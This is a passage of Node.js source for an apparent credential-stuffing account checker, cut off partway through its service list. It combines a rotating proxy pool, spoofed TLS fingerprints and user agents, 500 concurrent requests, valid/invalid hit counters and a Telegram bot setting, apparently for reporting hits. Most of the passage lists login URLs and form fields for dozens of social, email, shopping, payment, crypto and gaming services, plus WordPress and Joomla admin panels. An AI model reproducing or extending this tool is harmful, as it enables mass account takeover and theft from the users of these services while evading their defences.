const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const { spawn } = require('child_process');

// Core modules
const axios = require('axios');
const cheerio = require('cheerio');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const UserAgent = require('user-agents');
const FormData = require('form-data');
const { CookieJar } = require('tough-cookie');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ═══════════════════════════════════════════════════════════════
// CONFIGURATION & STATE
// ═══════════════════════════════════════════════════════════════

const CONFIG = {
    PORT: process.env.PORT || 3000,
    CONCURRENT_REQUESTS: parseInt(process.env.CONCURRENT) || 500,
    REQUEST_TIMEOUT: 15000,
    PROXY_REFRESH_INTERVAL: 300000, // 5 minutes
    MAX_RETRIES: 3,
    RATE_LIMIT_DELAY: 50,
    TELEGRAM_API: 'https://api.telegram.org/bot',
    JA3_FINGERPRINTS: [
        '769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0',
        '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
        '771,49195-49199-49196-49200-52393-52392-49161-49162-49171-49172-156-157-47-53-10,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0'
    ]
};

// Global state
let proxyPool = [];
let activeSessions = new Map();
let stats = {
    totalChecked: 0,
    valid: 0,
    invalid: 0,
    errors: 0,
    cpm: 0,
    startTime: null
};
let telegramConfig = { botToken: '', chatId: '' };
let isRunning = false;

// ═══════════════════════════════════════════════════════════════
// SERVICE DEFINITIONS (Full Grid from Screenshots)
// ═══════════════════════════════════════════════════════════════

const SERVICES = {
    // Social
    facebook: {
        name: 'Facebook',
        category: 'Social',
        icon: 'fa-brands fa-facebook',
        color: '#1877F2',
        url: 'https://www.facebook.com/login.php',
        checkMethod: 'api',
        fields: ['email', 'pass'],
        headers: {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/login.php'
        }
    },
    instagram: {
        name: 'Instagram',
        category: 'Social',
        icon: 'fa-brands fa-instagram',
        color: '#E4405F',
        url: 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {
            'x-ig-app-id': '936619743392459',
            'x-requested-with': 'XMLHttpRequest',
            'referer': 'https://www.instagram.com/accounts/login/'
        }
    },
    twitter: {
        name: 'Twitter/X',
        category: 'Social',
        icon: 'fa-brands fa-x-twitter',
        color: '#000000',
        url: 'https://api.twitter.com/1.1/onboarding/task.json',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {
            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            'x-twitter-client-language': 'en'
        }
    },
    tiktok: {
        name: 'TikTok',
        category: 'Social',
        icon: 'fa-brands fa-tiktok',
        color: '#000000',
        url: 'https://www.tiktok.com/passport/web/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    youtube: {
        name: 'YouTube',
        category: 'Social',
        icon: 'fa-brands fa-youtube',
        color: '#FF0000',
        url: 'https://accounts.google.com/signin/v2/identifier',
        checkMethod: 'google',
        fields: ['email', 'pass'],
        headers: {}
    },
    reddit: {
        name: 'Reddit',
        category: 'Social',
        icon: 'fa-brands fa-reddit',
        color: '#FF4500',
        url: 'https://www.reddit.com/api/login',
        checkMethod: 'api',
        fields: ['user', 'passwd'],
        headers: {}
    },
    linkedin: {
        name: 'LinkedIn',
        category: 'Social',
        icon: 'fa-brands fa-linkedin',
        color: '#0A66C2',
        url: 'https://www.linkedin.com/checkpoint/lg/login-submit',
        checkMethod: 'api',
        fields: ['session_key', 'session_password'],
        headers: {}
    },
    twitch: {
        name: 'Twitch',
        category: 'Social',
        icon: 'fa-brands fa-twitch',
        color: '#9146FF',
        url: 'https://passport.twitch.tv/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    kick: {
        name: 'Kick',
        category: 'Social',
        icon: 'fa-solid fa-k',
        color: '#53FC18',
        url: 'https://kick.com/api/v2/signin',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    trustpilot: {
        name: 'Trustpilot',
        category: 'Social',
        icon: 'fa-solid fa-star',
        color: '#00B67A',
        url: 'https://login.trustpilot.com',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },

    // Ads
    fb_ads: {
        name: 'FB Ads',
        category: 'Ads',
        icon: 'fa-brands fa-facebook',
        color: '#1877F2',
        url: 'https://business.facebook.com/login',
        checkMethod: 'api',
        fields: ['email', 'pass'],
        headers: {}
    },
    tt_ads: {
        name: 'TT Ads',
        category: 'Ads',
        icon: 'fa-brands fa-tiktok',
        color: '#000000',
        url: 'https://ads.tiktok.com/i18n/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    tw_ads: {
        name: 'TW Ads',
        category: 'Ads',
        icon: 'fa-brands fa-x-twitter',
        color: '#000000',
        url: 'https://ads.twitter.com/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },

    // Email
    gmail: {
        name: 'Google',
        category: 'Email',
        icon: 'fa-brands fa-google',
        color: '#4285F4',
        url: 'https://accounts.google.com/signin/v2/identifier',
        checkMethod: 'google',
        fields: ['email', 'pass'],
        headers: {}
    },
    gkeep: {
        name: 'G.Keep',
        category: 'Email',
        icon: 'fa-brands fa-google',
        color: '#FFBB00',
        url: 'https://accounts.google.com/signin/v2/identifier',
        checkMethod: 'google',
        fields: ['email', 'pass'],
        headers: {}
    },
    gpay: {
        name: 'G.Pay',
        category: 'Email',
        icon: 'fa-brands fa-google-pay',
        color: '#4285F4',
        url: 'https://accounts.google.com/signin/v2/identifier',
        checkMethod: 'google',
        fields: ['email', 'pass'],
        headers: {}
    },
    outlook: {
        name: 'Outlook',
        category: 'Email',
        icon: 'fa-brands fa-microsoft',
        color: '#0078D4',
        url: 'https://login.live.com/login.srf',
        checkMethod: 'microsoft',
        fields: ['login', 'passwd'],
        headers: {}
    },
    yahoo: {
        name: 'Yahoo',
        category: 'Email',
        icon: 'fa-brands fa-yahoo',
        color: '#6001D2',
        url: 'https://login.yahoo.com',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    aol: {
        name: 'AOL',
        category: 'Email',
        icon: 'fa-solid fa-a',
        color: '#FFBE00',
        url: 'https://login.aol.com',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    icloud: {
        name: 'iCloud',
        category: 'Email',
        icon: 'fa-brands fa-apple',
        color: '#000000',
        url: 'https://idmsa.apple.com/appleauth/auth/signin',
        checkMethod: 'api',
        fields: ['accountName', 'password'],
        headers: {}
    },
    mailru: {
        name: 'Mail.ru',
        category: 'Email',
        icon: 'fa-solid fa-envelope',
        color: '#005FF9',
        url: 'https://auth.mail.ru/cgi-bin/auth',
        checkMethod: 'api',
        fields: ['Login', 'Password'],
        headers: {}
    },
    yandex: {
        name: 'Yandex',
        category: 'Email',
        icon: 'fa-brands fa-yandex',
        color: '#FC3F1D',
        url: 'https://passport.yandex.ru/auth',
        checkMethod: 'api',
        fields: ['login', 'passwd'],
        headers: {}
    },
    rambler: {
        name: 'Rambler',
        category: 'Email',
        icon: 'fa-solid fa-r',
        color: '#315EFB',
        url: 'https://id.rambler.ru/login',
        checkMethod: 'api',
        fields: ['login', 'password'],
        headers: {}
    },
    seznam: {
        name: 'Seznam',
        category: 'Email',
        icon: 'fa-solid fa-s',
        color: '#D71A21',
        url: 'https://login.szn.cz',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    onet: {
        name: 'ONet',
        category: 'Email',
        icon: 'fa-solid fa-o',
        color: '#E41E13',
        url: 'https://konto.onet.pl/signin',
        checkMethod: 'api',
        fields: ['login', 'password'],
        headers: {}
    },
    wp_pl: {
        name: 'WP.pl',
        category: 'Email',
        icon: 'fa-brands fa-wordpress',
        color: '#21759B',
        url: 'https://profil.wp.pl/login.html',
        checkMethod: 'api',
        fields: ['login_username', 'password'],
        headers: {}
    },

    // Shopping
    amazon: {
        name: 'Amazon',
        category: 'Shopping',
        icon: 'fa-brands fa-amazon',
        color: '#FF9900',
        url: 'https://www.amazon.com/ap/signin',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    ebay: {
        name: 'eBay',
        category: 'Shopping',
        icon: 'fa-brands fa-ebay',
        color: '#E53238',
        url: 'https://signin.ebay.com/ws/eBayISAPI.dll',
        checkMethod: 'api',
        fields: ['userid', 'pass'],
        headers: {}
    },
    walmart: {
        name: 'Walmart',
        category: 'Shopping',
        icon: 'fa-solid fa-w',
        color: '#0071CE',
        url: 'https://www.walmart.com/account/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    booking: {
        name: 'Booking',
        category: 'Shopping',
        icon: 'fa-solid fa-b',
        color: '#003580',
        url: 'https://account.booking.com/sign-in',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    vinted: {
        name: 'Vinted',
        category: 'Shopping',
        icon: 'fa-solid fa-shirt',
        color: '#007782',
        url: 'https://www.vinted.com/auth/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    kleinanzeigen: {
        name: 'Kleinanz.',
        category: 'Shopping',
        icon: 'fa-solid fa-k',
        color: '#E60023',
        url: 'https://www.kleinanzeigen.de/m-einloggen.html',
        checkMethod: 'api',
        fields: ['emailOrUsername', 'password'],
        headers: {}
    },
    wallapop: {
        name: 'Wallapop',
        category: 'Shopping',
        icon: 'fa-solid fa-w',
        color: '#13C1AC',
        url: 'https://es.wallapop.com/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    shopify: {
        name: 'Shopify',
        category: 'Shopping',
        icon: 'fa-brands fa-shopify',
        color: '#96BF48',
        url: 'https://accounts.shopify.com/store-login',
        checkMethod: 'api',
        fields: ['login', 'password'],
        headers: {}
    },
    funpay: {
        name: 'FunPay',
        category: 'Shopping',
        icon: 'fa-solid fa-f',
        color: '#FF8C00',
        url: 'https://funpay.com/en/account/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    loaded: {
        name: 'Loaded',
        category: 'Shopping',
        icon: 'fa-solid fa-l',
        color: '#6366F1',
        url: 'https://loaded.nl/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },

    // Finance / Crypto
    paypal: {
        name: 'PayPal',
        category: 'Finance / Crypto',
        icon: 'fa-brands fa-paypal',
        color: '#003087',
        url: 'https://www.paypal.com/signin',
        checkMethod: 'api',
        fields: ['login_email', 'login_password'],
        headers: {}
    },
    coinbase: {
        name: 'Coinbase',
        category: 'Finance / Crypto',
        icon: 'fa-brands fa-bitcoin',
        color: '#0052FF',
        url: 'https://www.coinbase.com/signin',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    binance: {
        name: 'Binance',
        category: 'Finance / Crypto',
        icon: 'fa-brands fa-bitcoin',
        color: '#F0B90B',
        url: 'https://www.binance.com/en/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    bybit: {
        name: 'Bybit',
        category: 'Finance / Crypto',
        icon: 'fa-solid fa-b',
        color: '#F7A600',
        url: 'https://www.bybit.com/en-US/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    mexc: {
        name: 'MEXC',
        category: 'Finance / Crypto',
        icon: 'fa-solid fa-m',
        color: '#1E3A8A',
        url: 'https://www.mexc.com/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    freebitcoin: {
        name: 'Freebitco.in',
        category: 'Finance / Crypto',
        icon: 'fa-brands fa-bitcoin',
        color: '#F7931A',
        url: 'https://freebitco.in/',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },

    // Streaming
    spotify: {
        name: 'Spotify',
        category: 'Streaming',
        icon: 'fa-brands fa-spotify',
        color: '#1DB954',
        url: 'https://accounts.spotify.com/en/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    netflix: {
        name: 'Netflix',
        category: 'Streaming',
        icon: 'fa-brands fa-netflix',
        color: '#E50914',
        url: 'https://www.netflix.com/login',
        checkMethod: 'api',
        fields: ['userLoginId', 'password'],
        headers: {}
    },
    dropbox: {
        name: 'Dropbox',
        category: 'Streaming',
        icon: 'fa-brands fa-dropbox',
        color: '#0061FF',
        url: 'https://www.dropbox.com/login',
        checkMethod: 'api',
        fields: ['login_email', 'login_password'],
        headers: {}
    },
    humblebundle: {
        name: 'HumbleBundle',
        category: 'Streaming',
        icon: 'fa-solid fa-h',
        color: '#CC2229',
        url: 'https://www.humblebundle.com/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },

    // Gaming
    steam: {
        name: 'Steam',
        category: 'Gaming',
        icon: 'fa-brands fa-steam',
        color: '#1B2838',
        url: 'https://store.steampowered.com/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    epic: {
        name: 'Epic',
        category: 'Gaming',
        icon: 'fa-solid fa-e',
        color: '#FFFFFF',
        url: 'https://www.epicgames.com/id/login/epic',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    fortnite: {
        name: 'Fortnite',
        category: 'Gaming',
        icon: 'fa-solid fa-f',
        color: '#9D4DBB',
        url: 'https://www.epicgames.com/id/login/epic',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    roblox: {
        name: 'Roblox',
        category: 'Gaming',
        icon: 'fa-solid fa-r',
        color: '#000000',
        url: 'https://auth.roblox.com/v2/login',
        checkMethod: 'api',
        fields: ['username', 'password'],
        headers: {}
    },
    minecraft: {
        name: 'Minecraft',
        category: 'Gaming',
        icon: 'fa-solid fa-cube',
        color: '#62B47A',
        url: 'https://login.live.com/login.srf',
        checkMethod: 'microsoft',
        fields: ['login', 'passwd'],
        headers: {}
    },
    gog: {
        name: 'GOG',
        category: 'Gaming',
        icon: 'fa-solid fa-g',
        color: '#86328A',
        url: 'https://login.gog.com/login',
        checkMethod: 'api',
        fields: ['login', 'password'],
        headers: {}
    },
    hoyolab: {
        name: 'HoYoLab',
        category: 'Gaming',
        icon: 'fa-solid fa-h',
        color: '#4A90D9',
        url: 'https://account.hoyoverse.com',
        checkMethod: 'api',
        fields: ['account', 'password'],
        headers: {}
    },
    supercell: {
        name: 'Supercell',
        category: 'Gaming',
        icon: 'fa-solid fa-s',
        color: '#000000',
        url: 'https://supercell.com',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    nintendo: {
        name: 'Nintendo',
        category: 'Gaming',
        icon: 'fa-brands fa-nintendo-switch',
        color: '#E60012',
        url: 'https://accounts.nintendo.com/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    ea: {
        name: 'EA',
        category: 'Gaming',
        icon: 'fa-brands fa-ea',
        color: '#FF4747',
        url: 'https://accounts.ea.com',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    exitlag: {
        name: 'ExitLag',
        category: 'Gaming',
        icon: 'fa-solid fa-bolt',
        color: '#00D4FF',
        url: 'https://www.exitlag.com/login',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    eft: {
        name: 'EFT',
        category: 'Gaming',
        icon: 'fa-solid fa-crosshairs',
        color: '#C9A227',
        url: 'https://www.escapefromtarkov.com',
        checkMethod: 'api',
        fields: ['email', 'password'],
        headers: {}
    },
    battlenet: {
        name: 'Battle.net',
        category: 'Gaming',
        icon: 'fa-brands fa-battle-net',
        color: '#0074E0',
        url: 'https://us.battle.net/login/en/',
        checkMethod: 'api',
        fields: ['accountName', 'password'],
        headers: {}
    },

    // Other / Web Panels
    wordpress: {
        name: 'WordPress',
        category: 'Logs',
        icon: 'fa-brands fa-wordpress',
        color: '#21759B',
        url: '/wp-login.php',
        checkMethod: 'wp',
        fields: ['log', 'pwd'],
        headers: {}
    },
    joomla: {
        name: 'Joomla',
        category: 'Logs',
        icon: 'fa-brands fa-joomla',
        color: '#5091CD',
        url: '/administrator',
        checkMethod: 'c
